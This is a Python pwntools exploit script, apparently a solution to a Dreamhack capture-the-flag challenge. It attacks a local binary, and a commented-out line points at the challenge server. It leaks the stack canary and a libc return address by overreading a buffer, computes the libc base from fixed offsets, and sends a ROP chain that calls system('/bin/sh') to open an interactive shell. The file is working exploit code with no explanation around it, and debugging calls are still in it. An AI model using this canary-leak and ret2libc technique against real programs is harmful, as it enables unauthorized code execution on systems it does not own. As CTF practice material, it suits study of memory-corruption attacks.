from pwn import *

context.terminal = ['tmux', 'splitw', '-h']

def slog(name, addr): success(': '.join([name, hex(addr)]))

p = process('./prob')
# p = remote('host3.dreamhack.games', 16249)

# Leak Canary
p.sendafter(b'> ', b'2.')

p.sendafter(b'Write: .\n', b'a' * 0x100)

p.sendafter(b'> ', b'1.')

p.recvuntil(b'Read: .\n')
p.recvn(0x108)
canary = u64(p.recvn(8))

slog('canary', canary)

p.recvn(0x18)
libc_start_call_main = u64(p.recvn(8))

slog('libc_start_call_main', libc_start_call_main)

# Exploit

gdb.attach(p)
pause()

libc_base = libc_start_call_main - 128 - 0x29d10

slog('libc base', libc_base)

pop_rdi = libc_base + 0x2a3e5
ret = libc_base + 0x29cd6
system = libc_base + 0x50d60
binsh = libc_base + 0x1d8698

payload = b'A' * 0x18 + p64(canary) + b'12345678'
payload += p64(pop_rdi) + p64(binsh)
payload += p64(ret) + p64(system) + b'\x2e'

p.sendafter(b'3: clear.\n> ', payload)

p.interactive()